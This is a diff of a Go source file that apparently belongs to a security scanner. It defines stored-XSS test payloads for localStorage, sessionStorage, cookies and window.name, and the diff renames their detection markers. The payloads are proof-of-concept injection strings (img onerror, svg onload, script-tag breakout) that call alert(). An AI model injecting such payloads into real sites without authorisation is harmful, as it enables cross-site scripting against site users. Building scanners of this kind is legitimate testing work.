@@ -49,68 +49,68 @@ func StorageTypes() []StorageType {
 var allPayloads = []Payload{
 	// localStorage payloads
 	{
-		Value:       `<img src=x onerror=alert('skws_ls_1')>`,
-		Marker:      "skws_ls_1",
+		Value:       `<img src=x onerror=alert('assay_ls_1')>`,
+		Marker:      "assay_ls_1",
 		StorageType: LocalStorage,
 		Description: "localStorage: img tag with onerror",
 	},
 	{
-		Value:       `<svg onload=alert('skws_ls_2')>`,
-		Marker:      "skws_ls_2",
+		Value:       `<svg onload=alert('assay_ls_2')>`,
+		Marker:      "assay_ls_2",
 		StorageType: LocalStorage,
 		Description: "localStorage: svg with onload",
 	},
 	{
-		Value:       `"><script>alert('skws_ls_3')</script>`,
-		Marker:      "skws_ls_3",
+		Value:       `"><script>alert('assay_ls_3')</script>`,
+		Marker:      "assay_ls_3",
 		StorageType: LocalStorage,
 		Description: "localStorage: script tag breakout",
 	},
 
 	// sessionStorage payloads
 	{
-		Value:       `<img src=x onerror=alert('skws_ss_1')>`,
-		Marker:      "skws_ss_1",
+		Value:       `<img src=x onerror=alert('assay_ss_1')>`,
+		Marker:      "assay_ss_1",
 		StorageType: SessionStorage,
 		Description: "sessionStorage: img tag with onerror",
 	},
 	{
-		Value:       `<svg onload=alert('skws_ss_2')>`,
-		Marker:      "skws_ss_2",
+		Value:       `<svg onload=alert('assay_ss_2')>`,
+		Marker:      "assay_ss_2",
 		StorageType: SessionStorage,
 		Description: "sessionStorage: svg with onload",
 	},
 	{
-		Value:       `"><script>alert('skws_ss_3')</script>`,
-		Marker:      "skws_ss_3",
+		Value:       `"><script>alert('assay_ss_3')</script>`,
+		Marker:      "assay_ss_3",
 		StorageType: SessionStorage,
 		Description: "sessionStorage: script tag breakout",
 	},
 
 	// cookie payloads
 	{
-		Value:       `<img src=x onerror=alert('skws_ck_1')>`,
-		Marker:      "skws_ck_1",
+		Value:       `<img src=x onerror=alert('assay_ck_1')>`,
+		Marker:      "assay_ck_1",
 		StorageType: Cookie,
 		Description: "cookie: img tag with onerror",
 	},
 	{
-		Value:       `<svg onload=alert('skws_ck_2')>`,
-		Marker:      "skws_ck_2",
+		Value:       `<svg onload=alert('assay_ck_2')>`,
+		Marker:      "assay_ck_2",
 		StorageType: Cookie,
 		Description: "cookie: svg with onload",
 	},
 
 	// window.name payloads
 	{
-		Value:       `<img src=x onerror=alert('skws_wn_1')>`,
-		Marker:      "skws_wn_1",
+		Value:       `<img src=x onerror=alert('assay_wn_1')>`,
+		Marker:      "assay_wn_1",
 		StorageType: WindowName,
 		Description: "window.name: img tag with onerror",
 	},
 	{
-		Value:       `<svg onload=alert('skws_wn_2')>`,
-		Marker:      "skws_wn_2",
+		Value:       `<svg onload=alert('assay_wn_2')>`,
+		Marker:      "assay_wn_2",
 		StorageType: WindowName,
 		Description: "window.name: svg with onload",
 	},
